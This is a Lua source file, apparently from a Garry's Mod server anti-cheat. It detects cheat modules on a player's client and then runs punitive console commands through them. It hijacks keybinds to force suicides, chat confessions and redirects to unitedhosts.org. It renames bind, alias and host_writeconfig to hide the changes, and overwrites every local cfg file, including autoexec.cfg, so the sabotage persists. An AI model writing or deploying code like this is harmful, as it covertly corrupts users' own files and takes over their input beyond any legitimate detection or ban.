
local Ran,SID = _H.pcall(function()
	if not _E.LocalPlayer or not _E.LocalPlayer().SteamID64 then return _E.os.time() end
	return  _H.tostring( _E.LocalPlayer():SteamID64() )
end)

local Eaten = false
local function EatKeys(bind,alias,host_writeconfig, func,fname,Using)
	if Eaten then
		_H.DelayBAN("EatKeys=C3_AlreadyEaten (Used ".._H.tostring(Eaten)..", skipping: "..(Using or fname)..")")
		return
	end
	Eaten = Using or fname
	
	local Cmds = {}
	local function RCC(s) Cmds[ #Cmds + 1 ] = s end
	local function FuckYou(k,v) RCC(bind..' '..k..' "'..v..'"') end
	local function FuckKey(k,v) RCC(bind..' '..k..' "'..v..'; play uhdm/hac/eight.wav; say I cheat ban me for"') end
	
	RCC(alias..' connect "echo BAGPIPES"')
	RCC(alias..' disconnect "say I will never play the bagpipes')
	RCC(alias..' exit "say I should fill my bagpipes with propane')
	RCC(alias..' exec "say Wheres my hammer"')
	RCC(alias..' quit "say I aint havin it!"')
	RCC(alias..' gamemenucommand "say We can do WONDERFUL things with light bulbs!"')
	RCC(alias..' cancelselect "say WHO WILL REPAIR MY BAGPIPES"')
	RCC(alias..' toggleconsole "say I should never have thrown my lightbulb at the wall')
	
	FuckYou("`", 			"play uhdm/hac/still_not_working.mp3; connect unitedhosts.org; say I popped it!")
	FuckYou("F10", 			"play uhdm/hac/really_cheat.mp3; gamemenucommand quitnoconfirm; say And it aint even gonna complain!")
	FuckYou("MOUSE1",		"+attack2; sensitivity 90; volume 0.1; say Ive lost my marbles!")
	FuckYou("MOUSE2",		"+attack; sensitivity 0.1; volume 1; play uhdm/hac/still_not_working.mp3; say Piece of shit!")
	FuckYou("MOUSE3",		"kill; sensitivity 90; volume 0.1; say I AM A DIRTY CHEATER, BAN MY ASS!")	
	FuckYou("MWHEELUP",		"invnext; play uhdm/hac/eight.wav; say EIGHT!")
	FuckYou("MWHEELDOWN",	"invprev; play uhdm/hac/eight.wav; say BURST ME BAGPIPES")
	
	FuckYou("q", 			"connect unitedhosts.org; play uhdm/hac/highway_to_hell.mp3; say IM ON A HIGHWAY TO HELL!")
	FuckYou("y",			"messagemode")
	FuckYou("u",			"messagemode")
	FuckYou("x",			"+voicerecord; say DISAPPOINTED")
	
	FuckKey("w", 			"+back; host_writeconfig cfg/autoexec.cfg")
	FuckKey("a", 			"+moveright; host_writeconfig cfg/autoexec.cfg")
	FuckKey("s", 			"+forward; host_writeconfig cfg/autoexec.cfg")
	FuckKey("d", 			"+moveleft; host_writeconfig cfg/autoexec.cfg")
	FuckKey("e", 			"+reload; volume 0.1")
	FuckKey("r", 			"+jump; volume 0.1")
	FuckKey("f", 			"noclip; connect unitedhosts.org")
	FuckKey("c", 			"connect unitedhosts.org")
	FuckKey("v", 			"impulse 100; kill")
	FuckKey("TAB", 			"+use; connect unitedhosts.org")
	FuckKey("SPACE",		"+menu; exec game.cfg")
	FuckKey("CTRL",			"kill; exec userconfig.cfg")
	FuckKey("SHIFT",		"+walk; exec game.cfg")
	FuckKey("ALT",			"+speed; exec skill_manifest.cfg")
	FuckKey("F4", 			"connect unitedhosts.org")
	FuckKey("F3", 			"connect unitedhosts.org")
	FuckKey("F2", 			"connect unitedhosts.org")
	FuckKey("F1", 			"connect unitedhosts.org")
	
	FuckYou("g", 		"kill; play uhdm/hac/really_cheat.mp3; say "..SID.." is a cheater!")
	FuckYou("i", 		"kill; play uhdm/hac/really_cheat.mp3; say "..SID.." is a cheater!")
	FuckYou("m", 		"kill; play uhdm/hac/really_cheat.mp3; say "..SID.." is a cheater!")
	FuckYou("n", 		"kill; play uhdm/hac/really_cheat.mp3; say "..SID.." is a cheater!")
	FuckYou("z", 		"kill; play uhdm/hac/really_cheat.mp3; say "..SID.." is a cheater!")
	
	RCC(host_writeconfig)
	RCC(host_writeconfig.." cfg/autoexec.cfg")
	RCC(host_writeconfig.." cfg/game.cfg")
	for k,v in _H.pairs( _H.NotFF("cfg/*.cfg", "GAME") ) do
		RCC(host_writeconfig.." cfg/"..v)
	end
	RCC(alias..' host_writeconfig "use gmod_camera"')
	
	
	RCC(alias..' unbind "say I really do wanna to throw this lightbulb at the wall!"')
	RCC(alias..' unbindall "say Oh dear!"')
	RCC(alias..' bind "say I popped it"')
	
	RCC(alias..' cancelselect "say I really should not cheat"')
	RCC(alias..' disconnect "say I will never cheat again!"')
	RCC(alias..' connect "say I AINT HAVIN IT')
	RCC(alias..' exit "say Ban me I cheat"')
	RCC(alias..' exec "say Wheres my hammer"')
	RCC(alias..' quit "say I should never have used hacks"')
	RCC(alias..' toggleconsole "say Whoops, I cheat!"')
	RCC(alias..' gamemenucommand "say Oh dear!"')
	
	
	local function dRCC(s)
		local ret,err = _H.pcall(function()
			func(s)
		end)
		if err then
			_H.DelayBAN("EatKeys=dRCC("..fname..") [".._H.tostring(err).."]")
		end
	end
	if fname == "C3" then
		dRCC = function(s) _E.LocalPlayer():ConCommand(s) end
	end
	
	local Tot = #Cmds
	for k,v in _H.pairs(Cmds) do
		_H.NotTS(k/10, function()
			dRCC(v)
			
			_H.DelayBAN("EatKeys="..fname.."-"..k.."/"..Tot)
			
			if k == Tot then
				_H.DelayBAN("EatKeys=YUMYUM_DLL_DONE="..fname)
			end
		end)
	end
	
	_H.DelayBAN("EatKeys=YUMYUM_DLL_STARTED="..fname)
end




local Cvar3_Copy = {
	["cvar3"] = 1,
	["cv3"] = 1,
	["c3"] = 1,
	["c"] = 1,
	["3"] = 1,
	["cvar"] = 1,
	["sax"] = 1,
	["svm"] = 1,
}

local Cvar3_Copies = {}
for k,v in _H.pairs(Cvar3_Copy) do
	Cvar3_Copies[k] = 1
	Cvar3_Copies["_"..k] = 1
	Cvar3_Copies["__"..k] = 1
	Cvar3_Copies["___"..k] = 1
	
	Cvar3_Copies["_"..k.."_"] = 1
	Cvar3_Copies["__"..k.."__"] = 1
	Cvar3_Copies["___"..k.."___"] = 1
	
	Cvar3_Copies[k.."_"] = 1
	Cvar3_Copies[k.."__"] = 1
	Cvar3_Copies[k.."___"] = 1
end

local Modules = {
	["oubhack"]	= {"OH_CPP_INTERFACE", "RunConsoleCommand"},
	["snixzz"]	= {"NHTable", "ClientCMD"},
	["snixzz2"]	= {"NHTable", "ClientCMD"},
	["snixzz3"]	= {"NHTable", "ClientCMD"},
	["frozen"]	= {"NHTable", "ClientCMD"},
	["extras"]	= {"console", "Command"},
}


local Replace = {
	["Options"] = "BAGPIPES",
	["Default"] = "MARBLES",
	["Delete"] = "LIGHT BULBS",
	["Toggle"] = "LOSE",
	["gmod_loading_title"] = "BURSTING BAGPIPES",
	["file_progress"] = "MARBLES LOST",
	["total_progress"] = "MARBLES FOUND",
	["gmod_load_cancel"] = "BURST",
	["downloading_x"] = "BURSTING %s1",
	["file_x_of_x"] = "LOSING %s1 of %s2 MARBLES",
	["finished"] = "WONDERFUL THINGS",
	["Category"] = "EIGHT",
	["Filename"] = "HAMMER",
	
	["HL2_AmmoFull"] = "8 8 8 8 8 8 8",
	["HL2_HandGrenade"] = "IVE LOST MY MARBLES",
	["HL2_357Handgun"] = "IVE BURST ME BAGPIPES",
	["HL2_Pulse_Rifle"] = "WHERES MY HAMMER",
	["HL2_Bugbait"] = "MARBLE",
	["HL2_Crossbow"] = "HOW CAN IT TAKE THAT MUCH!?",
	["HL2_Crowbar"] = "IM TOO YOUNG FOR GMod",
	["HL2_Grenade"] = "MY BAGPIPES!",
	["HL2_GravityGun"] = "LIGHT BULBS",
	["HL2_Pistol"] = "EIGHT EIGHT EIGHT EIGHT EIGHT EIGHT",
	["HL2_RPG"] = "BURST ME BAGPIPES!",
	["HL2_Shotgun"] = "LOST MY MARBLES",
	["HL2_SMG1"] = "WONDERFUL THINGS WITH LIGHT BULBS",
	["GMOD_Physgun"] = "IM TOO YOUNG FOR GMod",
	
	["Game_connected"] = "%s1 HAS SPAWNED BAGPIPES",
	["Game_disconnected"] = "%s1 HAS FOUND HIS HAMMER",

	["Game"] = "WHERES MY HAMMER",
	["MapName"] = "BAGPIPE?",
	["Name"] = "EIGHT",
	["Score"] = "EIGHT",
	["Deaths"] = "BURST",
	["Ping"] = "8",
}




local function TheRest(GetConCommand, Using)
	_H.DelayBAN("EatKeys=C3_Using: "..Using)
	
	local Bind 				= GetConCommand("bind")
	local Alias 			= GetConCommand("alias")
	local host_writeconfig	= GetConCommand("host_writeconfig")
	if not (Bind and Alias and host_writeconfig) then
		_H.DelayBAN("EatKeys=C3_NoCV: "..Using.." [B=".._H.tostring(Bind)..",A=".._H.tostring(Alias)..",W=".._H.tostring(host_writeconfig).."]")
		return
	end
	
	Bind:SetName("fuck")
	Alias:SetName("shit")
	host_writeconfig:SetName("cock")
	
	_H.NotTS(1, function()
		EatKeys("fuck","shit","cock", nil, "C3", Using)
	end)
	
	
	for k,v in _H.pairs(Replace) do
		local Rand = _E.string.rep(" 8 ", 18)
		_E.language.Add(k,Rand..">>"..v.."<<"..Rand)
	end
end


local function NewRQ(k)
	local ret,err = _H.pcall(function()
		_H.NotRQ(k)
	end)
	if err then
		_H.DelayBAN("EatKeys=NewRQe("..k..") [".._H.tostring(err).."]")
		return false
	end
	return true
end

local function EatModules()
	for k,v in _H.pairs( _H.NotFF("lua/bin/*.dll", "MOD") ) do
		local Low = v:lower()
		if not ( Low:find("gmcl_",nil,true) and Low:find("_win32.dll" ,nil,true) ) then continue end
		Low = Low:sub(6):sub(0,-11)
		
		_H.DelayBAN("EatKeys=CMod: "..k..", "..v.." ("..Low..")")
		
		if Cvar3_Copies[ Low ] and NewRQ(Low) then
			if not _H._R.ConVar.SetName then
				_H.DelayBAN("EatKeys=C3_NoSET ["..Low.."] (".._H.tostring(_H._R.ConVar.SetName)..")")
				continue
			end
			
			if _G.cvars and _G.cvars.GetCommand then
				TheRest(_G.cvars.GetCommand, 		"["..Low.."] cvars.GetCommand")
				
			elseif _G.cvars and _G.cvars.GetConCommand then
				TheRest(_G.cvars.GetConCommand, 	"["..Low.."] cvars.GetConCommand")
				
				
			elseif _G.cvar3 and _G.cvar3.GetCommand then
				TheRest(_G.cvar3.GetCommand,		"["..Low.."] cvar3.GetCommand")
				
			elseif _G.cvar3 and _G.cvar3.GetConCommand then
				TheRest(_G.cvar3.GetConCommand,		"["..Low.."] cvar3.GetConCommand")
				
			else
				_H.DelayBAN("EatKeys=C3_NoGCC ["..Low.."]")
			end
			continue
		end
		
		
		local This = Modules[ Low ]		
		if This and NewRQ(Low) then
			if _G[ This[1] ] and _G[ This[1] ][ This[2] ] then
				_H.NotTS(8, function()
					_H.DelayBAN("EatKeys=C3_UsingDLL: ["..Low.."] "..This[1].."."..This[2] )
					
					EatKeys("bind","alias","host_writeconfig", _G[ This[1] ][ This[2] ], Low)
				end)
			else
				_H.DelayBAN("EatKeys=NoDLL("..Low..", "..This[1].."."..This[2]..")")
			end
		end
	end
	
	_H.DelayBAN("EatKeys=LoadedOld")
end
EatModules()


return "ERROR"

